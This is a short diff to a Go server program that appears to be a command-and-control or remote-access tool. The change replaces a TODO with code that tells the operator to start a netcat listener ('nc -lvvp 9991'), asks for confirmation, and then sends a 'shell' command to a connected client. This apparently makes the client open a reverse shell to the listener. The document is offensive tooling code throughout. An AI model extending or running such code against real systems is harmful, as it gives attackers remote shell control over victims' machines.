@@ -5,6 +5,8 @@ import (
     "log"
     "os"
     "fmt"
+    "strings"
+    "bufio"
     )
 
 
@@ -54,10 +56,24 @@ func (server *Server) SendCommandToClient(client Client, input string, logger *L
         if input != "shell" {
             logger.ErrorLogger.Println("Error, command not found -> ", input)
         } else {
-            clientConn.Write([]byte(input))
-            fmt.Println(input)
-            // TODO: start nc here
-            // maybe use a nc implementation in go, or try to execute from os.exec
+            fmt.Println("Start your nc shell in another terminal (nc -lvvp 9991)")
+            reader := bufio.NewReader(os.Stdin)
+            fmt.Printf("\nReady? > ")
+            input, err := reader.ReadString('\n')
+            input = strings.TrimSpace(input)
+
+            if err != nil {
+                logger.ErrorLogger.Println("Error while reading the user input")
+            } else {
+                switch input {
+                case "yes":
+                    clientConn.Write([]byte("shell"))
+                case "no":
+                    fmt.Println("No problem")
+                    return
+                }
+            }
+
         }
     }
 }
